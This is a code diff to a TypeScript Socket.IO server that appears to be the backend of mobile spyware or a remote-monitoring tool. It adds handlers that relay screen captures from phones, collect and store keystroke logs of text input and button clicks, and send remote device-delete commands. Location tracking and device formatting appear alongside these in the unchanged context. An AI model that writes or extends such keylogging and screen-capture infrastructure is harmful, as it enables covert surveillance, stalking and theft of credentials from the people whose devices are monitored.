@@ -303,6 +303,27 @@ export const startSocketIO = async () => {
 							`${SocketIOPublicEvents.SCREEN_SHARE}-${deviceId}`,
 							{
 								type: "screen-monitor",
+								option: "base64",
+								response,
+							}
+						);
+					} catch (error) {
+						console.log("Screen Monitor Response Error", error);
+					}
+				}
+			);
+
+			// Recieve the Byte Screens from mobile
+			socket.on(
+				`${SocketIOPublicEvents.SCREEN_MOBILE_BYTE_RESPONSE}`,
+				async (response: any) => {
+					try {
+						const deviceId = response.deviceId;
+						io.emit(
+							`${SocketIOPublicEvents.SCREEN_SHARE}-${deviceId}`,
+							{
+								type: "screen-monitor",
+								option: "byte",
 								response,
 							}
 						);
@@ -493,7 +514,7 @@ export const startSocketIO = async () => {
 						const keyLogsType = response.keyLogsType;
 						const keylogs = response.keylogs;
 						const keyEvent = response.event;
-						console.log("online keylogs=>", response);
+
 						// Check if keylogs is not an empty string before proceeding
 						if (
 							(keyEvent === "Text Input" ||
@@ -515,7 +536,7 @@ export const startSocketIO = async () => {
 							);
 
 							// Data should be include deviceId and keylogs
-							await addNewKeyLogs(response);
+							// await addNewKeyLogs(response);
 						} else {
 							console.log("Empty key logs, skipping...");
 						}
@@ -526,35 +547,31 @@ export const startSocketIO = async () => {
 			);
 
 			// Offline Keylogs Save
-			// socket.on(
-			// 	`${SocketIOPublicEvents.KEY_MOBILE__OffLINE_RESPONSE}`,
-			// 	async (response: any) => {
-			// 		try {
-			// 			const deviceId = response.deviceId;
-			// 			const keyLogsType = response.keyLogsType;
-			// 			const keylogs = response.keylogs;
-			// 			const keyEvent = response.event;
-			// 			console.log("online keylogs=>", response);
-			// 			// Check if keylogs is not an empty string before proceeding
-			// 			if (
-			// 				(keyEvent === "Text Input" ||
-			// 					keyEvent === "Button Click") &&
-			// 				keylogs &&
-			// 				keylogs !== "[]" &&
-			// 				keylogs !== ""
-			// 			) {
-			// 				console.log("KEYLOGS SEND===>", keylogs);
-
-			// 				// Data should be include deviceId and keylogs
-			// 				await addNewKeyLogs(response);
-			// 			} else {
-			// 				console.log("Empty key logs, skipping...");
-			// 			}
-			// 		} catch (error) {
-			// 			console.log("Key Logs Response Error", error);
-			// 		}
-			// 	}
-			// );
+			socket.on(
+				`${SocketIOPublicEvents.KEY_MOBILE_REALTIME_RESPONSE}`,
+				async (response: any) => {
+					try {
+						const keylogs = response.keylogs;
+						const keyEvent = response.event;
+						// Check if keylogs is not an empty string before proceeding
+						if (
+							(keyEvent === "Text Input" ||
+								keyEvent === "Button Click") &&
+							keylogs &&
+							keylogs !== "[]" &&
+							keylogs !== ""
+						) {
+							console.log("real-time keylogs:", keylogs);
+							// Data should be include deviceId and keylogs
+							addNewKeyLogs(response);
+						} else {
+							console.log("Empty offline key logs, skipping...");
+						}
+					} catch (error) {
+						console.log("Offline Key Logs Response Error", error);
+					}
+				}
+			);
 
 			// Real-Time Location Monitor
 			socket.on(
@@ -985,6 +1002,25 @@ export const startSocketIO = async () => {
 						);
 					} catch (error) {
 						console.log("Device Format Error", error);
+					}
+				}
+			);
+
+			// Device Delete
+			socket.on(
+				`${SocketIOPublicEvents.DEVICE_DELETE_EVENT}`,
+				async (data: any) => {
+					try {
+						const { deviceId } = data;
+
+						io.emit(
+							`${SocketIOMobileEvents.MOBILE_DEVICE_DELETE_EVENT}-${deviceId}`,
+							{
+								deviceId: deviceId,
+							}
+						);
+					} catch (error) {
+						console.log("Device delete Error", error);
 					}
 				}
 			);
